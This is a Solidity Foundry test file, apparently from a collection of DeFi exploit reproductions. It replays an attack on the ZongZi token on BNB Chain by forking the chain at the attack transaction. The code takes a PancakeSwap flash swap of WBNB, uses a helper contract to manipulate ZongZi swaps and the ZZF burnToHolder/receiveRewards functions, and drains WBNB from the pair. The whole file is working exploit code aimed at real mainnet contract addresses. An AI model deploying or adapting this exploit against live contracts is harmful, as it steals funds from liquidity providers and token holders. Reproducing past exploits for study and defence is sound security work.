// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";

import "./IZongZi.sol";
import "./IZzf.sol";

interface IZZF is IERC20 {
    function burnToHolder(uint256 amount, address _invitation) external;

    function receiveRewards(address to) external;
}

WBNB constant BNB = WBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
IERC20 constant ZongZi = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
IPancakePairV2 constant BUSDT_WBNB = IPancakePairV2(
    0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
);
IPancakePairV2 constant WBNB_ZONGZI = IPancakePairV2(
    0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe
);
IPancakeRouterV2 constant Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
address constant attackContract = 0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9;
bytes32 constant attackTx = hex"247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f";

IZZF constant Zzf = IZZF(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b);

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", attackTx);
        vm.label(address(BNB), "WBNB");
        vm.label(address(ZongZi), "ZongZi");
        vm.label(address(BUSDT_WBNB), "BUSDT_WBNB");
        vm.label(address(WBNB_ZONGZI), "WBNB_ZONGZI");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            BNB.balanceOf(address(this)),
            18
        );

        uint256 pairWBNBBalance = BNB.balanceOf(address(WBNB_ZONGZI));
        uint256 multiplier = uint256(
            vm.load(attackContract, bytes32(uint256(9)))
        );

        uint256 amount1Out = (pairWBNBBalance * multiplier) /
            ((pairWBNBBalance * 100) / address(ZongZi).balance);

        BUSDT_WBNB.swap(0, amount1Out, address(this), abi.encode(uint8(1)));

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            BNB.balanceOf(address(this)),
            18
        );
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        _sender;
        _amount0;
        _data;

        Helper helper = new Helper();
        BNB.transfer(address(helper), _amount1);
        helper.exploit();

        ZongZi.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(BNB);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZongZi.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 86400
        );
        BNB.transfer(address(BUSDT_WBNB), (_amount1 * 10026) / 10000);
    }
}

contract Helper {
    function exploit() external {
        BNB.approve(address(Router), type(uint256).max);
        ZongZi.approve(address(Router), type(uint256).max);
        uint256 balanceBeforeWBNB = BNB.balanceOf(address(this));

        makeSwap(1e17, address(BNB), address(ZongZi));
        makeSwap(
            ZongZi.balanceOf(address(this)),
            address(ZongZi),
            address(BNB)
        );

        uint256 amountIn = balanceBeforeWBNB - 1e17;
        makeSwap(amountIn, address(BNB), address(ZongZi));

        uint256 amountOut = address(ZongZi).balance - 1e9;
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(BNB);
        uint256[] memory amounts = Router.getAmountsIn(amountOut, path);

        Zzf.burnToHolder(amounts[0], msg.sender);
        Zzf.receiveRewards(address(this));

        makeSwap(
            ZongZi.balanceOf(address(this)),
            address(ZongZi),
            address(BNB)
        );

        BNB.deposit{value: address(this).balance}();
        BNB.transfer(msg.sender, BNB.balanceOf(address(this)));
    }

    function makeSwap(
        uint256 amountIn,
        address tokenA,
        address tokenB
    ) private {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 86400
        );
    }

    receive() external payable {}
}
